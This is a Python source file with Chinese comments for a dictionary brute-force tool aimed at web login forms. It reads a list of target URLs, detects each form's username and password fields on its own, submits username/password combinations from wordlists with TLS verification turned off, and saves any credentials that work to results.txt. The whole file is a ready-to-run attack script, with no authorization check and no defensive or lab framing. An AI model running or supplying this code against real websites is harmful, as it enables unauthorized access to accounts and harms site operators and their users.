import requests
from bs4 import BeautifulSoup
import config
from utils import logger, load_file
import urllib3
from urllib.parse import urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 全局停止标志
STOP_FLAG = False

def get_form_details(url):
    """
    提取表单详情：action url, username field name, password field name
    """
    try:
        resp = requests.get(url, timeout=config.TIMEOUT, verify=False)
        soup = BeautifulSoup(resp.content, "html.parser")
        
        forms = soup.find_all("form")
        for form in forms:
            action = form.attrs.get("action")
            # 处理相对路径
            post_url = urljoin(url, action) if action else url
            
            user_field = None
            pass_field = None
            
            inputs = form.find_all("input")
            for i in inputs:
                input_type = i.attrs.get("type", "text")
                input_name = i.attrs.get("name")
                
                if not input_name:
                    continue
                    
                if input_type == "password":
                    pass_field = input_name
                elif input_type in ["text", "email"] and not user_field:
                    # 简单假设第一个文本框是用户名
                    user_field = input_name
            
            if user_field and pass_field:
                return post_url, user_field, pass_field
                
    except Exception as e:
        logger.error(f"解析表单失败 {url}: {e}")
    
    return None, None, None

def run_simple_crack():
    """
    针对简单列表进行字典爆破
    """
    global STOP_FLAG
    logger.info("开始简单模式爆破...")
    
    targets = load_file(config.SIMPLE_LIST_FILE)
    usernames = load_file(config.USERNAME_FILE) or config.DEFAULT_USERNAMES
    passwords = load_file(config.PASSWORD_FILE) or config.DEFAULT_PASSWORDS
    
    for url in targets:
        if STOP_FLAG:
            logger.warning("任务已停止")
            return

        logger.info(f"正在尝试爆破: {url}")
        post_url, user_field, pass_field = get_form_details(url)
        
        if not post_url or not user_field or not pass_field:
            logger.warning(f"无法自动识别表单字段，跳过: {url}")
            continue
            
        logger.info(f"目标详情: URL={post_url}, UserField={user_field}, PassField={pass_field}, STOP_ON_SUCCESS={config.STOP_ON_SUCCESS}")
        
        found = False
        for user in usernames:
            if found and config.STOP_ON_SUCCESS: break # 如果发现成功且开启了停止策略，则跳出用户循环
            if STOP_FLAG: break
            for i, pwd in enumerate(passwords):
                if STOP_FLAG: break
                
                try:
                    # 强制使用 info 级别打印进度，确保用户能看到
                    logger.info(f"[{url}] 尝试: {user}:{pwd} ({i+1}/{len(passwords)})")
                    data = {
                        user_field: user,
                        pass_field: pwd
                    }
                    # 这里需要根据实际情况调整判断逻辑，比如检查响应码或关键词
                    resp = requests.post(post_url, data=data, timeout=5, verify=False, allow_redirects=False)
                    
                    # 简单判断成功：重定向(302)或者响应长度显著变化
                    is_success = False
                    
                    if resp.status_code in [301, 302]:
                        location = resp.headers.get("Location", "").lower()
                        # 如果重定向回登录页或错误页，则不是成功
                        if "login" not in location and "error" not in location and "fail" not in location:
                            is_success = True
                    elif "success" in resp.text.lower() or "welcome" in resp.text.lower() or "admin" in resp.text.lower():
                        # 页面包含成功关键词
                        is_success = True
                    
                    # 排除一些明显的错误页面特征
                    text_lower = resp.text.lower()
                    if any(k.lower() in text_lower for k in config.ERROR_KEYWORDS):
                        is_success = False

                    if is_success:
                        logger.info(f"[SUCCESS] 爆破成功: {url} -> {user}:{pwd}")
                        with open("results.txt", "a", encoding="utf-8") as f:
                            f.write(f"{url} | {user}:{pwd}\n")
                        
                        if config.STOP_ON_SUCCESS:
                            found = True
                            break # 跳出密码循环
                    else:
                        logger.info(f"[{url}] 尝试失败: {user}:{pwd}")
                        pass
                        
                except Exception as e:
                    logger.error(f"[{url}] 请求异常 ({user}:{pwd}): {e}")
                    pass
        
        if not found and not STOP_FLAG:
            logger.info(f"爆破结束，未找到有效凭据: {url}")

if __name__ == '__main__':
    run_simple_crack()
